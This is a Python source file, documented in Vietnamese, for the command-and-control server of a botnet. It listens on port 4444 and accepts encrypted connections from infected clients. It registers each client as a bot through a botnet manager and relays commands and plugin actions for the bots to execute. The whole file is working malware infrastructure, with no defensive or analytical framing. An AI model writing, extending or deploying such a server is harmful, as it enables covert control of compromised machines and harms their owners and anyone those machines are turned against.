from __future__ import annotations
import socket
import threading
import json
import time
import orjson
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
import logging
from utils.crypto import Crypto
from botnet.manager import BotnetManager
from core.plugin_system import PluginManager
from concurrent.futures import ThreadPoolExecutor
import queue
import lru

class Server:
    def __init__(self, host: str = '0.0.0.0', port: int = 4444,
                 max_connections: int = 1000,
                 recv_buffer: int = 8192) -> None:
        self.host = host
        self.port = port
        self.sock: Optional[socket.socket] = None
        self.running = False
        self.start_time = 0.0

        # Performance settings
        self.max_connections = max_connections
        self.recv_buffer = recv_buffer
        
        # Components
        self.crypto = Crypto()
        self.botnet = BotnetManager()
        self.plugin_manager = PluginManager()
        
        # Connection handling
        self.thread_pool = ThreadPoolExecutor(max_workers=32)
        self.connection_pool = queue.Queue(maxsize=max_connections)
        
        # Client connections with LRU cache
        self.clients = lru.LRU(max_connections)
        self.client_lock = threading.Lock()
        
        # Response caching
        self.response_cache = lru.LRU(1000)
        self.cache_lock = threading.Lock()
        
        # Setup logging
        self.logger = logging.getLogger(__name__)
        
    def initialize(self) -> bool:
        """Khởi tạo server

        Returns:
            bool: True nếu khởi tạo thành công
        """
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.sock.bind((self.host, self.port))
            self.sock.listen(5)
            
            self.running = True
            self.start_time = time.time()
            
            # Load plugins
            self.plugin_manager.load_plugins()
            
            self.logger.info(f"Server initialized on {self.host}:{self.port}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error initializing server: {str(e)}")
            if self.sock:
                self.sock.close()
            return False
            
    def start(self) -> None:
        """Bắt đầu chấp nhận kết nối"""
        if not self.sock or not self.running:
            raise RuntimeError("Server not initialized")
            
        accept_thread = threading.Thread(target=self._accept_connections)
        accept_thread.daemon = True
        accept_thread.start()
        
    def stop(self) -> None:
        """Dừng server và đóng tất cả kết nối"""
        self.running = False
        
        # Close all client connections
        with self.client_lock:
            for client in self.clients.values():
                if 'socket' in client:
                    client['socket'].close()
            self.clients.clear()
            
        # Stop plugins
        self.plugin_manager.stop_all()
        
        # Close server socket
        if self.sock:
            self.sock.close()
            
        self.logger.info("Server stopped")
        
    def _accept_connections(self) -> None:
        """Thread chấp nhận kết nối mới"""
        while self.running and self.sock:
            try:
                client, address = self.sock.accept()
                client_thread = threading.Thread(
                    target=self._handle_client,
                    args=(client, address)
                )
                client_thread.daemon = True
                client_thread.start()
                
                self.logger.info(f"New connection from {address[0]}:{address[1]}")
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"Error accepting connection: {str(e)}")
                    
    def _handle_client(self, client: socket.socket, address: Tuple[str, int]) -> None:
        """Xử lý kết nối client

        Args:
            client (socket.socket): Client socket
            address (Tuple[str, int]): Client address (host, port)
        """
        client_id = f"{address[0]}:{address[1]}"
        
        try:
            # Add to clients list
            with self.client_lock:
                self.clients[client_id] = {
                    'socket': client,
                    'address': address,
                    'connected_at': time.time()
                }
                
            while self.running:
                # Receive data with optimized buffer
                chunks = []
                while True:
                    chunk = client.recv(self.recv_buffer)
                    if not chunk:
                        break
                    chunks.append(chunk)
                    if len(chunk) < self.recv_buffer:
                        break
                        
                if not chunks:
                    break
                    
                encrypted_data = b''.join(chunks)
                    
                # Check cache first
                cache_key = encrypted_data
                with self.cache_lock:
                    if cache_key in self.response_cache:
                        client.send(self.response_cache[cache_key])
                        continue
                
                # Decrypt and process if not in cache
                data = self.crypto.decrypt(encrypted_data)
                response = self._process_client_data(client_id, data)
                
                # Encrypt and cache response
                encrypted_response = self.crypto.encrypt(orjson.dumps(response))
                with self.cache_lock:
                    self.response_cache[cache_key] = encrypted_response
                
                # Send response
                client.send(encrypted_response)
                
        except Exception as e:
            self.logger.error(f"Error handling client {client_id}: {str(e)}")
            
        finally:
            # Clean up client
            self._remove_client(client_id)
            
    def _process_client_data(self, client_id: str, data: str) -> Dict[str, Any]:
        """Xử lý dữ liệu từ client

        Args:
            client_id (str): ID của client
            data (str): Dữ liệu đã giải mã

        Returns:
            Dict[str, Any]: Response gửi về client
        """
        try:
            request = json.loads(data)
            command = request.get('command')
            args = request.get('args', [])
            
            # Update client info
            if command == 'register':
                return self._register_client(client_id, args)
                
            # Process command
            elif command == 'command':
                return self._execute_command(client_id, args)
                
            # Plugin command
            elif command.startswith('plugin.'):
                plugin_name = command.split('.')[1]
                return self._execute_plugin_command(plugin_name, args)
                
            else:
                return {
                    'status': 'error',
                    'message': 'Unknown command'
                }
                
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    def _register_client(self, client_id: str, info: Dict) -> Dict[str, Any]:
        """Đăng ký thông tin client mới

        Args:
            client_id (str): ID của client
            info (Dict): Thông tin client

        Returns:
            Dict[str, Any]: Response xác nhận
        """
        try:
            with self.client_lock:
                if client_id in self.clients:
                    self.clients[client_id].update(info)
                    
            # Add to botnet
            self.botnet.add_bot(client_id, info)
            
            return {
                'status': 'success',
                'message': 'Registered successfully'
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    def _execute_command(self, client_id: str, command: Dict) -> Dict[str, Any]:
        """Thực thi lệnh trên client

        Args:
            client_id (str): ID của client
            command (Dict): Thông tin lệnh cần thực thi

        Returns:
            Dict[str, Any]: Kết quả thực thi
        """
        try:
            result = self.botnet.execute_command(client_id, command)
            return {
                'status': 'success',
                'data': result
            }
            
        except Exception as e:
            return {
                'status': 'error',
                'message': str(e)
            }
            
    def _execute_plugin_command(self, plugin_name: str, args: List) -> Dict[str, Any]:
        """Thực thi lệnh plugin

        Args:
            plugin_name (str): Tên plugin
            args (List): Tham số cho plugin

        Returns:
            Dict[str, Any]: Kết quả từ plugin
        """
        try:
            plugin = self.plugin_manager.get_plugin(plugin_name)
            if not plugin:
                raise ValueError(f"Plugin {plugin_name} not found")
                
            result = plugin.execute(*args)
            return {
                'status': 'success',
                'data': result
            }
            
        except Exception as e:
            return {
                'status': 'error', 
                'message': str(e)
            }
            
    def _remove_client(self, client_id: str) -> None:
        """Xóa client khỏi danh sách và trả connection vào pool

        Args:
            client_id (str): ID của client cần xóa
        """
        with self.client_lock:
            if client_id in self.clients:
                if 'socket' in self.clients[client_id]:
                    self.clients[client_id]['socket'].close()
                del self.clients[client_id]
                
        # Remove from botnet
        self.botnet.remove_bot(client_id)
        
    def get_uptime(self) -> float:
        """Lấy thời gian server đã chạy

        Returns:
            float: Số giây đã chạy
        """
        return time.time() - self.start_time
        
    def get_stats(self) -> Dict[str, Any]:
        """Lấy thống kê của server

        Returns:
            Dict[str, Any]: Thông tin thống kê
        """
        return {
            'uptime': self.get_uptime(),
            'total_clients': len(self.clients),
            'active_plugins': len(self.plugin_manager.get_active_plugins())
        }